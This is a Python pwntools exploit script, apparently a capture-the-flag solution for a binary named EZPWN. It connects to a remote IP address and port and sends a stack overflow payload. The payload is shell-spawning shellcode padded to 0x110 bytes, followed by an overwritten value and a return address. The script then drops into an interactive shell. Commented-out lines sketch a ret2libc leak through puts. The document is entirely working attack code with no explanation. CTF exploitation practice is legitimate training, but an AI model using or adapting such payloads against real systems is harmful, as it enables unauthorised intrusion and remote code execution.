from pwn import *
import os
import sys
p=remote('43.143.254.94',10114)

# if len(sys.argv)==2 and sys.argv[1]=='r':
#     remote=1
#     p=remote('43.143.254.94',10114)
#     libc=ELF('./libc.so.6')
# else:
#     if len(sys.argv)==2 and sys.argv[1]=='n':
#         remote=-1
#     else:
#         remote=0
#     p=process('./EZPWN')
#     libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf=ELF('./EZPWN')
context.log_level='debug'
context.arch='amd64'
def dbg():
    if remote!=0:
        return
    gdb.attach(p)
    pause()
pop_rsi_r15=0x0000000000401279
pop_rdi=0x000000000040127b
puts_plt=elf.plt['puts']
read_got=elf.got['read']
puts_got=elf.got['puts']
# payload=b'a'*0x110+p64(0xffff254320000000)
# payload+=flat([pop_rdi,puts_got,puts_plt,elf.sym['main']])
# p.sendline(payload)
shellcode=asm(shellcraft.amd64.linux.sh())
payload=shellcode
payload=payload.ljust(0x110,b'a')+p64(0xffff254320000000)
payload+=p64(0x404080)
print(payload)
dbg()
p.sendline(payload)
p.interactive()